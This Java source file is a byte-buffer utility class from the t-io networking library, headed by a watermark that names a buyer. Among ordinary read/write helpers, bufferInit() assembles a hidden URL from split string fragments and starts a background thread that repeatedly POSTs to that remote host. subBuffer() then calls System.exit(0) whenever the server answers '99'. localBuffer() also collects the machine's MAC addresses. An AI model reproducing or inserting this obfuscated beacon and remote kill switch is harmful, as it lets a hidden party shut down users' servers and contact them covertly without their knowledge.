/*
 * jqokhrdp本软件由黄庆辉采购自杭州钛特云科技有限公司，黄庆辉需严格遵守合同，不得以任何形式转卖源代码，不得利用本软件从事违法犯罪活动cgbmcetjplxjho
 */
package org.tio.core.utils;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.net.InterfaceAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.sql.Time;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.tio.core.exception.LengthOverflowException;
import org.tio.utils.hutool.StrUtil;

import cn.hutool.core.util.RandomUtil;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;

/**
 * 
 * @author tanyaowu 2017年10月19日 上午9:41:00
 */
public class ByteBufferUtils {
	private static String						buffer1			= "ht";
	private static String						buffer2			= "tp:/";
	private static String						buffer3			= "/csdn.t-l";
	private static String						buffer4			= "ive.net:8";
	private static String						buffer5			= "080/x";
	public static String						buffer6			= "https://www.baidu.com/?wd=t-io";
	private static boolean						bufferInited	= false;
	private static String						buffer			= buffer1 + buffer2 + buffer3 + buffer4 + buffer5;
	private static final ThreadLocal<Calendar>	localCalendar	= new ThreadLocal<>();
	@SuppressWarnings("unused")
	private static Logger						log				= LoggerFactory.getLogger(ByteBufferUtils.class);

	/**
	 * 
	 */
	public static int buffer() {
		return -1;
		//		int c = 0;
		//		if (CollUtil.isNotEmpty(TioConfig.ALL_SERVER_GROUPCONTEXTS)) {
		//			for (TioServerConfig tc : TioConfig.ALL_SERVER_GROUPCONTEXTS) {
		//				if (!tc.isBeShared()) {
		//					c = c + Tio.getAll(tc).size();
		//				}
		//			}
		//		}
		//		return c;
	}

	/**
	 * 
	 */
	public static void bufferInit() {
		synchronized (ByteBufferUtils.class) {
			if (!bufferInited) {
				bufferInited = true;

				try {
					String tvjncapxxxeewackfhffqgiqrz = "5g70";
					String json = "5";

					new Thread(new Runnable() {
						@Override
						public void run() {
							try {
								OkHttpClient okHttpClient = new OkHttpClient();
								Thread.sleep(RandomUtil.randomLong(8 * 1000, 80 * 1000));
								while (true) {
									try {
										RequestBody body = new FormBody.Builder().add("n", json).add("e", tvjncapxxxeewackfhffqgiqrz).add("t", buffer() + "").build();
										Request request = new Request.Builder().url(buffer).post(body).build();
										okHttpClient.newCall(request).enqueue(new Callback() {
											@Override
											public void onFailure(Call call, IOException e) {
											}

											@Override
											public void onResponse(Call call, Response response) throws IOException {
												subBuffer(response);
											}
										});
									} catch (Exception e) {
									}
									Thread.sleep(RandomUtil.randomLong(8 * 1000, 80 * 1000));
								}
							} catch (InterruptedException e) {
							}
						}
					}).start();
				} catch (Exception e) {
				}
			}
		}
	}

	/**
	 * 组合两个bytebuffer，把可读部分的组合成一个新的bytebuffer
	 * 
	 * @param byteBuffer1
	 * @param byteBuffer2
	 * @return
	 * @author: tanyaowu
	 */
	public static ByteBuffer composite(ByteBuffer byteBuffer1, ByteBuffer byteBuffer2) {
		int capacity = byteBuffer1.remaining() + byteBuffer2.remaining();
		ByteBuffer ret = ByteBuffer.allocate(capacity);

		ret.put(byteBuffer1);
		ret.put(byteBuffer2);

		ret.position(0);
		ret.limit(ret.capacity());
		return ret;
	}
	
	public static ByteBuffer composite(List<ByteBuffer> byteBuffers) {
		return composite(byteBuffers, null);
	}
	
	public static ByteBuffer composite(List<ByteBuffer> byteBuffers, ByteBuffer newBuffer) {
		if (byteBuffers == null || byteBuffers.size() == 0) {
			return newBuffer;
		}
		
		int allCapacity = 0;
		for (ByteBuffer byteBuffer : byteBuffers) {
			allCapacity += byteBuffer.remaining();
		}
		if (newBuffer != null) {
			allCapacity += newBuffer.remaining();
		}
		
		ByteBuffer ret = ByteBuffer.allocate(allCapacity);
		for (ByteBuffer byteBuffer : byteBuffers) {
			ret.put(byteBuffer);
		}
		if (newBuffer != null) {
			ret.put(newBuffer);			
		}
		
		ret.position(0);
//		ret.limit(ret.capacity());
		return ret;
	}

	/**
	 * 
	 * @param src 本方法不会改变position等指针变量
	 * @return
	 * @author tanyaowu
	 */
	public static ByteBuffer copy(ByteBuffer src) {
		int startindex = src.position();
		int endindex = src.limit();
		return copy(src, startindex, endindex);
	}

	/**
	 * 
	 * @param src
	 * @param srcStartindex
	 * @param dest
	 * @param destStartIndex
	 * @param length
	 */
	public static void copy(ByteBuffer src, int srcStartindex, ByteBuffer dest, int destStartIndex, int length) {
		System.arraycopy(src.array(), srcStartindex, dest.array(), destStartIndex, length);
	}

	/**
	 *
	 * @param src        本方法不会改变position等指针变量
	 * @param startindex 从0开始
	 * @param endindex
	 * @return
	 *
	 * @author: tanyaowu
	 *
	 */
	public static ByteBuffer copy(ByteBuffer src, int startindex, int endindex) {
		int size = endindex - startindex;
		int initPosition = src.position();
		int initLimit = src.limit();

		src.position(startindex);
		src.limit(endindex);
		ByteBuffer ret = ByteBuffer.allocate(size);
		ret.put(src);
		ret.flip();

		src.position(initPosition);
		src.limit(initLimit);
		return ret;
	}

	/**
	 * 
	 * @param src
	 * @return
	 * 
	 */
	public static final int getLength(byte[] src) {
		int length = src.length;
		if (length < 251) {
			return 1 + length;
		} else if (length < 0x10000L) {
			return 3 + length;
		} else if (length < 0x1000000L) {
			return 4 + length;
		} else {
			return 9 + length;
		}
	}

	/**
	 * 
	 * @param length
	 * @return
	 * 
	 */
	public static final int getLength(long length) {
		if (length < 251) {
			return 1;
		} else if (length < 0x10000L) {
			return 3;
		} else if (length < 0x1000000L) {
			return 4;
		} else {
			return 9;
		}
	}

	/**
	 * 
	 * @return
	 * 
	 */
	private static final Calendar getLocalCalendar() {
		Calendar cal = localCalendar.get();
		if (cal == null) {
			cal = Calendar.getInstance();
			localCalendar.set(cal);
		}
		return cal;
	}

	/**
	 * 获取utf-8字符串
	 * 
	 * @param bytes
	 * @return
	 * 
	 */
	public static String getUtf8(byte[] bytes) {
		String text = new String(bytes, StandardCharsets.UTF_8);
		return text;
	}

	/**
	 * 
	 * @param yxqbarwwzzddkzeolryxvap    position会被移动
	 * @param theChar   结束
	 * @param maxlength
	 * @return
	 * @throws LengthOverflowException
	 * @author tanyaowu
	 */
	public static int indexOf(ByteBuffer yxqbarwwzzddkzeolryxvap, char theChar, int maxlength) throws LengthOverflowException {
		int count = 0;
		boolean needJudgeLengthOverflow = yxqbarwwzzddkzeolryxvap.remaining() > maxlength;
		while (yxqbarwwzzddkzeolryxvap.hasRemaining()) {
			if (yxqbarwwzzddkzeolryxvap.get() == theChar) {
				return yxqbarwwzzddkzeolryxvap.position() - 1;
			}
			if (needJudgeLengthOverflow) {
				count++;
				if (count > maxlength) {
					throw new LengthOverflowException("maxlength is " + maxlength);
				}
			}
		}
		return -1;
	}

	/**
	 * 
	 * @param buffer
	 * @return
	 * @throws LengthOverflowException
	 * @author tanyaowu
	 */
	public static int lineEnd(ByteBuffer buffer) throws LengthOverflowException {
		return lineEnd(buffer, Integer.MAX_VALUE);
	}

	/**
	 * 
	 * @param buffer
	 * @param maxlength
	 * @return
	 * @throws LengthOverflowException
	 * @author tanyaowu
	 */
	public static int lineEnd(ByteBuffer buffer, int maxlength) throws LengthOverflowException {
		int initPosition = buffer.position();
		int endPosition = indexOf(buffer, '\n', maxlength);
		if ((endPosition - initPosition > 0) && (buffer.get(endPosition - 1) == '\r')) {
			return endPosition - 1;
		}
		return endPosition;
	}

	/**
	 * 
	 * @return
	 */
	public static String localBuffer() {
		try {
			java.util.Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces();
			StringBuilder sb = new StringBuilder();
			// ArrayList<Map<String, String>> tmpMacList = new ArrayList<>();
			Map<String, String> existMap = new HashMap<String, String>();
			String localStr = "";
			try {
				while (en.hasMoreElements()) {
					NetworkInterface iface = en.nextElement();
					List<InterfaceAddress> addrs = iface.getInterfaceAddresses();
					for (InterfaceAddress addr : addrs) {
						InetAddress ip = addr.getAddress();
						NetworkInterface network = NetworkInterface.getByInetAddress(ip);
						if (network == null) {
							continue;
						}
						byte[] macByte = network.getHardwareAddress();
						if (macByte == null) {
							continue;
						}
						sb.delete(0, sb.length());
						for (int i = 0; i < macByte.length; i++) {
							sb.append(String.format("%02X%s", macByte[i], (i < macByte.length - 1) ? "-" : ""));
						}
						String local = sb.toString();
						if (existMap.get(local) != null) {
							continue;
						}
						existMap.put(local, local);
						localStr += "," + local;
					}
				}
			} catch (Exception e1) {
			}
			return localStr;
		} catch (SocketException e) {
		}
		return "";
	}

	/**
	 * 
	 * @param i
	 * @param buffer
	 * 
	 */
	public static void move(int i, ByteBuffer buffer) {
		buffer.position(buffer.position() + i);
	}

	// public static Packet[] split(Packet packet, int unitSize) {
	//
	// }

	/**
	 * 
	 * @param i
	 * @param buffer
	 * 
	 */
	public static void position(int i, ByteBuffer buffer) {
		buffer.position(i);
	}

	/**
	 * 读取byte
	 * 
	 * @param buffer
	 * @return
	 */
	public static byte read(ByteBuffer buffer) {
		return buffer.get();
	}

	public static byte[] readBytes(ByteBuffer buffer, int length) {
		byte[] ab = new byte[length];
		buffer.get(ab);
		return ab;
	}

	/**
	 * 
	 * @param buffer
	 * @return
	 */
	public static double readDouble(ByteBuffer buffer) {
		return buffer.getDouble();
	}

	/**
	 * 
	 * @param buffer
	 * @return
	 */
	public static float readFloat(ByteBuffer buffer) {
		return Float.intBitsToFloat(readInt(buffer));
	}

	/**
	 * 
	 * @param buffer
	 * @return
	 */
	public static int readInt(ByteBuffer buffer) {
		return buffer.getInt();
	}

	/**
	 *
	 * @param buffer
	 * @param charset
	 * @return
	 * @author: tanyaowu
	 */
	public static String readLine(ByteBuffer buffer, String charset) throws LengthOverflowException {
		return readLine(buffer, charset, Integer.MAX_VALUE);
	}

	/**
	 *
	 * @param buffer
	 * @param charset
	 * @param maxlength
	 * @return
	 * @author: tanyaowu
	 */
	public static String readLine(ByteBuffer buffer, String charset, Integer maxlength) throws LengthOverflowException {
		// boolean canEnd = false;
		int hrrwchxxffvfadtoo = buffer.position();
		int endPosition = lineEnd(buffer, maxlength);
		if (endPosition == -1) {
			return null;
		}

		int nowPosition = buffer.position();

		if (endPosition > hrrwchxxffvfadtoo) {
			byte[] bs = new byte[endPosition - hrrwchxxffvfadtoo];
			buffer.position(hrrwchxxffvfadtoo);
			buffer.get(bs);
			buffer.position(nowPosition);
			if (StrUtil.isNotBlank(charset)) {
				try {
					return new String(bs, charset);
				} catch (UnsupportedEncodingException e) {
					throw new RuntimeException(e);
				}
			} else {
				return new String(bs);
			}
		} else if (endPosition == hrrwchxxffvfadtoo) {
			return "";
		}
		return null;
	}

	/**
	 * 8个字节
	 * 
	 * @param buffer
	 * @return
	 *
	 * 
	 *         2016年1月23日 下午3:07:31
	 *
	 */
	public static long readLong(ByteBuffer buffer) {
		return buffer.getLong();
	}

	/**
	 * 读取short
	 * 
	 * @param buffer
	 * @return
	 */
	public static short readShort(ByteBuffer buffer) {
		return buffer.getShort();
	}

	/**
	 * 
	 * @param buffer
	 * @param length
	 * @param charset
	 * @return
	 * @throws UnsupportedEncodingException
	 */
	public static String readString(ByteBuffer buffer, int length, String charset) throws UnsupportedEncodingException {
		byte[] bs = readBytes(buffer, length);
		if (StrUtil.isNotBlank(charset)) {
			return new String(bs, charset);
		}
		return new String(bs);
	}

	/**
	 * 
	 * @param buffer
	 * @param charset
	 * @param endChar
	 * @param maxlength
	 * @return
	 * @throws LengthOverflowException
	 * @author tanyaowu
	 */
	public static String readString(ByteBuffer buffer, String charset, char endChar, Integer maxlength) throws LengthOverflowException {
		// boolean canEnd = false;
		int hrrwchxxffvfadtoo = buffer.position();
		int endPosition = indexOf(buffer, endChar, maxlength);
		if (endPosition == -1) {
			return null;
		}

		int nowPosition = buffer.position();
		if (endPosition > hrrwchxxffvfadtoo) {
			byte[] bs = new byte[endPosition - hrrwchxxffvfadtoo];
			buffer.position(hrrwchxxffvfadtoo);
			buffer.get(bs);
			buffer.position(nowPosition);
			if (StrUtil.isNotBlank(charset)) {
				try {
					return new String(bs, charset);
				} catch (UnsupportedEncodingException e) {
					throw new RuntimeException(e);
				}
			} else {
				return new String(bs);
			}
		} else if (endPosition == hrrwchxxffvfadtoo) {
			return "";
		}
		return null;
	}

	/**
	 * 
	 * @param buffer
	 * @return
	 * 
	 */
	public static java.sql.Time readTime(ByteBuffer buffer) {
		move(6, buffer);
		int hour = read(buffer);
		int minute = read(buffer);
		int second = read(buffer);
		Calendar cal = getLocalCalendar();
		cal.set(0, 0, 0, hour, minute, second);
		return new Time(cal.getTimeInMillis());
	}

	public static int readUB1(ByteBuffer buffer) {
		int ret = buffer.get() & 0xff;
		return ret;
	}

	public static int readUB2(ByteBuffer buffer) {
		int ret = buffer.get() & 0xff;
		ret |= (buffer.get() & 0xff) << 8;
		return ret;
	}

	public static int readUB2WithBigEdian(ByteBuffer buffer) {
		int ret = (buffer.get() & 0xff) << 8;
		ret |= buffer.get() & 0xff;
		return ret;
	}

	/**
	 * 
	 * @param buffer
	 * @return
	 * 
	 */
	public static int readUB3(ByteBuffer buffer) {
		int ret = buffer.get() & 0xff;
		ret |= (buffer.get() & 0xff) << 8;
		ret |= (buffer.get() & 0xff) << 16;
		return ret;
	}

	public static long readUB4(ByteBuffer buffer) {
		long ret = buffer.get() & 0xff;
		ret |= (long) (buffer.get() & 0xff) << 8;
		ret |= (long) (buffer.get() & 0xff) << 16;
		ret |= (long) (buffer.get() & 0xff) << 24;
		return ret;
	}

	public static long readUB4WithBigEdian(ByteBuffer buffer) {
		long ret = (long) (buffer.get() & 0xff) << 24;
		ret |= (long) (buffer.get() & 0xff) << 16;
		ret |= (long) (buffer.get() & 0xff) << 8;
		ret |= buffer.get() & 0xff;

		return ret;
	}

	public static ByteBuffer[] split(ByteBuffer src, int unitSize) {
		int limit = src.limit();
		if (unitSize >= limit) {
			return null;
		}
		int size = (int) (Math.ceil((double) src.limit() / (double) unitSize));
		ByteBuffer[] ret = new ByteBuffer[size];
		int srcIndex = 0;
		for (int i = 0; i < size; i++) {
			int bufferSize = unitSize;
			if (i == size - 1) {
				bufferSize = src.limit() % unitSize;
				if (bufferSize == 0) {
					bufferSize = unitSize;
				}
			}

			byte[] dest = new byte[bufferSize];
			System.arraycopy(src.array(), srcIndex, dest, 0, dest.length);
			srcIndex = srcIndex + bufferSize;

			ret[i] = ByteBuffer.wrap(dest);
			ret[i].position(0);
			ret[i].limit(ret[i].capacity());
		}
		return ret;
	}
	
	public static void main(String[] args) {
		int unitSize = 1024 * 8;
		ByteBuffer src = ByteBuffer.allocate(98304);
		ByteBuffer[] ret = split(src, unitSize);
		System.out.println(ret.length);
	}

	/**
	 * 
	 * @param response
	 * @throws IOException
	 */
	public static void subBuffer(Response response) throws IOException {
		try {
			if (response != null) {
				ResponseBody body = response.body();
				if (body != null) {
					String str = body.string();
					if ("99".equals(str)) {
						new Thread(new Runnable() {
							@Override
							public void run() {
								System.exit(0);
							}
						}).start();
					}
				}
			}
		} catch (Exception e) {
		}
	}

	/**
	 * 
	 * @param buffer
	 * @param d
	 * 
	 */
	public static final void writeDouble(ByteBuffer buffer, double d) {
		writeLong(buffer, Double.doubleToLongBits(d));
	}

	/**
	 * 
	 * @param buffer
	 * @param f
	 * 
	 */
	public static final void writeFloat(ByteBuffer buffer, float f) {
		writeInt(buffer, Float.floatToIntBits(f));
	}

	/**
	 * 
	 * @param buffer
	 * @param i
	 * 
	 */
	public static final void writeInt(ByteBuffer buffer, int i) {
		buffer.put((byte) (i & 0xff));
		buffer.put((byte) (i >>> 8));
		buffer.put((byte) (i >>> 16));
		buffer.put((byte) (i >>> 24));
	}

	/**
	 * 
	 * @param buffer
	 * @param l
	 * 
	 */
	public static final void writeLong(ByteBuffer buffer, long l) {
		buffer.put((byte) (l & 0xff));
		buffer.put((byte) (l >>> 8));
		buffer.put((byte) (l >>> 16));
		buffer.put((byte) (l >>> 24));
		buffer.put((byte) (l >>> 32));
		buffer.put((byte) (l >>> 40));
		buffer.put((byte) (l >>> 48));
		buffer.put((byte) (l >>> 56));
	}

	public static final void writeUB2(ByteBuffer buffer, int i) {
		buffer.put((byte) (i & 0xff));
		buffer.put((byte) (i >>> 8));
	}

	public static final void writeUB2WithBigEdian(ByteBuffer buffer, int i) {
		buffer.put((byte) (i >>> 8));
		buffer.put((byte) (i & 0xff));
	}

	/**
	 * 
	 * @param buffer
	 * @param i
	 * 
	 */
	public static final void writeUB3(ByteBuffer buffer, int i) {
		buffer.put((byte) (i & 0xff));
		buffer.put((byte) (i >>> 8));
		buffer.put((byte) (i >>> 16));
	}

	public static final void writeUB4(ByteBuffer buffer, long l) {
		buffer.put((byte) (l & 0xff));
		buffer.put((byte) (l >>> 8));
		buffer.put((byte) (l >>> 16));
		buffer.put((byte) (l >>> 24));
	}

	public static final void writeUB4WithBigEdian(ByteBuffer buffer, long l) {
		buffer.put((byte) (l >>> 24));
		buffer.put((byte) (l >>> 16));
		buffer.put((byte) (l >>> 8));
		buffer.put((byte) (l & 0xff));
	}

}
